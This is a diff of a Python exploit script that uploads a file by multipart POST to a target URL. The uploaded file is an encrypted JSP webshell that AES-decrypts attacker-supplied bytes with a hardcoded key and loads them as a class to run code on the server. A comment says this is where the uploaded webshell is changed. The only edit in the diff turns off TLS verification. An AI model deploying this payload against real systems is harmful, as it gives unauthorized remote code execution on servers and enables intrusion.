@@ -15,7 +15,7 @@ def exp(url):
     data = "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\nContent-Disposition: form-data; name=\"file\"; filename=\"123.jsp\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*......tas9er*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\r\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--"#这里修改上传的webshell
     #data="--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\nContent-Disposition: form-data; name=\"file\"; filename=\"123.txt\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\nthis is a test!\r\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--"
     try:
-        r=requests.post(target_url, headers=headers, data=data)
+        r=requests.post(target_url, headers=headers, data=data,verify=False)
         #print(r.text)
         if "success" in r.text:
             pattern=re.compile(r'"data":"(.*)"}')
